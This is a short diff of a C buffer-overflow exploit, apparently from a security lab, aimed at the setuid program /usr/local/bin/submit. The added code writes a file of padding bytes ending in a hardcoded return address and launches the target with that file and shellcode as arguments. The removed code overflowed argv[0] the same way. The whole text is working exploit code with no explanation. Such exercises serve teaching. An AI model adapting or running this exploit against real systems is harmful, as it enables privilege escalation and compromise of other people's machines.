@@ -6,7 +6,9 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <sys/stat.h>
 #include "shellcode.h"
+
 
 #define TARGET "/usr/local/bin/submit"
 
@@ -14,33 +16,28 @@ int main(void)
 {
   char *args[4];
   char *env[1];
-
-  // another way
-  int syntaxLen = strlen("Syntax:\n\t");
-  int addressLen = 4;
-  int bufferLen = 211 - syntaxLen + addressLen + 1;
-  char buffer[bufferLen + addressLen + 1];
-
+  int bufferSize = 2048;
   int i = 0;
 
+  FILE *f;
 
-  while(i < bufferLen) {
-    buffer[i] = 'm';
+  f = fopen("filename.txt", "w");
+
+  while(i <= bufferSize + 4 - 1) {
+    fprintf(f, "%c", 'm');
     i = i + 1;
   }
-  //0x ff bf df b8 - b8 dd bf ff
+  fprintf(f, "%c", 0xb8);
+  fprintf(f, "%c", 0xdf);
+  fprintf(f, "%c", 0xbf);
+  fprintf(f, "%c", 0xff);
 
 
-  buffer[i++] = 0xb8;
-  buffer[i++] = 0xdf;
-  buffer[i++] = 0xbf;
-  buffer[i++] = 0xff;
+  fclose(f);
 
 
-  //append address of shellcode
-
-  args[0] = buffer; 
-  args[1] = "-h"; 
+  args[0] = "blah"; 
+  args[1] = "filename.txt"; 
   args[2] = shellcode; 
   args[3] = NULL;
 
